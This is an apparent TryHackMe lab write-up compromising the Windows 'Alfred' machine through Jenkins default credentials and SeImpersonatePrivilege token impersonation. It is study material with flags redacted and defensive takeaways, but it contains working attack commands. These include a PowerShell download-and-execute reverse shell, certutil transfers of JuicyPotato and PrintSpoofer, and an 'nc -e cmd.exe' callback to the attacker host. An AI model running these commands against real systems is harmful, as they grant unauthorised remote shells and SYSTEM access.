# Alfred - TryHackMe

> **Kill Chain Summary**:
> TCP Port Scanning (Ports 80, 3389, 8080) -> Jenkins Automation Server Discovery -> Authentication via Default Credentials (`admin:admin`) -> Remote Code Execution via Jenkins Build Step -> Nishang PowerShell Reverse Shell -> Foothold as `bruce` -> Privilege Enumeration (`whoami /priv` -> `SeImpersonatePrivilege Enabled`) -> Token Impersonation via JuicyPotato / PrintSpoofer -> Elevated Shell (`NT AUTHORITY\SYSTEM`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Alfred |
| **Platform** | TryHackMe |
| **OS** | Windows 7 (IIS 7.5) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Jenkins Default Credentials, PowerShell Reverse Shell (Nishang), Token Impersonation (SeImpersonatePrivilege) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap with the `-Pn` flag to bypass Windows host discovery firewall blocks:

```bash
sudo nmap -Pn -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.140.50 10.10.140.50
```

**Open Ports:**

| Port | Service | Version | Description |
| :--- | :--- | :--- | :--- |
| 80/tcp | HTTP | Microsoft IIS 7.5 | Web landing page |
| 3389/tcp | RDP | Microsoft Terminal Services | Remote Desktop protocol |
| 8080/tcp | HTTP | Jetty 9.4 (Jenkins) | Jenkins CI/CD Automation Server |

### 1.2 Jenkins Enumeration (Port 8080)

Navigating to `http://10.10.140.50:8080/` displays a standard Jenkins authentication portal.

Testing standard default administrative credentials:
- **Username:** `admin`
- **Password:** `admin`

Authentication succeeds, granting administrative access to the Jenkins management dashboard.

---

## 2. Initial Access

Jenkins provides execution environments through build projects or the administrative Groovy script console.

### 2.1 Staging the PowerShell Reverse Shell

On the Kali attack host, retrieve the Nishang `Invoke-PowerShellTcp.ps1` reverse shell script:

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Host the payload using a Python HTTP server on port 8000:

```bash
python3 -m http.server 8000
```

Start a Netcat listener:

```bash
nc -lvnp 4444
```

### 2.2 Executing via Jenkins Build Project

1. Inside the Jenkins dashboard, navigate to **New Item** -> create a **Freestyle project**.
2. Under the **Build** section, add a build step: **Execute Windows batch command**.
3. Supply a PowerShell one-liner that downloads and executes Nishang directly in memory:

```powershell
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
```

4. Save the project and click **Build Now**.

The build executes the command and connects back to the listener:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.140.50] 49172
Windows PowerShell running as user bruce on ALFRED
PS C:\Program Files (x86)\Jenkins\workspace\project> whoami
alfred\bruce
```

Retrieve the user flag:

```powershell
type C:\Users\bruce\Desktop\user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration: Account Privileges

Checking assigned Windows token privileges:

```powershell
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

The `SeImpersonatePrivilege` token privilege is **Enabled**.

> [!NOTE] Concept: SeImpersonatePrivilege Exploitation
> Accounts holding `SeImpersonatePrivilege` can impersonate any security token they receive. By coercing an elevated service (`NT AUTHORITY\SYSTEM`) to authenticate to a rogue local named pipe or RPC endpoint, exploits capture the SYSTEM token and spawn processes with administrative authority.

### 3.2 Exploitation: Token Impersonation

Depending on the specific Windows kernel build, tools such as **JuicyPotato** or **PrintSpoofer** can be deployed.

#### Method 1: JuicyPotato
Because the host is running Windows 7 / Windows Server 2008, JuicyPotato is compatible with BITS CLSIDs.

Transfer `JuicyPotato.exe` and a standalone `nc.exe` binary:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/JuicyPotato.exe JP.exe
certutil -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
```

Start an elevated listener on port 5555:

```bash
nc -lvnp 5555
```

Execute JuicyPotato to trigger a reverse shell as `SYSTEM`:

```cmd
.\JP.exe -l 1337 -p cmd.exe -a "/c C:\Users\bruce\nc.exe 10.10.14.5 5555 -e cmd.exe" -t *
```

#### Method 2: PrintSpoofer
Alternatively, PrintSpoofer provides a single-step escalation path:

```cmd
certutil -urlcache -split -f http://10.10.14.5:8000/PrintSpoofer.exe PrintSpoofer.exe
PrintSpoofer.exe -i -c cmd
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessWithTokenW() OK
C:\Windows\system32> whoami
nt authority\system
```

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Nmap Scan Bypassing ICMP Ping Filter
sudo nmap -Pn -sC -sV -p- -T4 -oA nmap/full_tcp_<IP> <IP>

# PowerShell In-Memory Script Download and Execution
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<KALI_IP>:<PORT>/script.ps1')

# Windows Native File Transfer via certutil
certutil -urlcache -split -f http://<KALI_IP>:<PORT>/binary.exe target.exe

# Exploit SeImpersonatePrivilege with PrintSpoofer
PrintSpoofer.exe -i -c cmd
```

---

## 5. Key Takeaways and Lessons Learned

1. **ICMP Filter Evasion:** On Windows machines, always use the `-Pn` flag with Nmap. Windows Firewall drops ICMP echo requests by default, which can cause scanners to misidentify live hosts as inactive.
2. **CI/CD Attack Surface:** Automation servers (Jenkins, TeamCity, GitLab Runners) must never be exposed with default credentials. Any build configuration interface provides trivial command execution.
3. **SeImpersonate Privilege Reliability:** Finding `SeImpersonatePrivilege Enabled` on a Windows service account provides an immediate path to `NT AUTHORITY\SYSTEM`. Choose the appropriate potato exploit based on the Windows kernel build (JuicyPotato for Windows 7/2008, PrintSpoofer for Windows 10/2016+).

---

#tryhackme #windows #easy #jenkins #default-credentials #powershell #nishang #token-impersonation #seimpersonate #certutil #privesc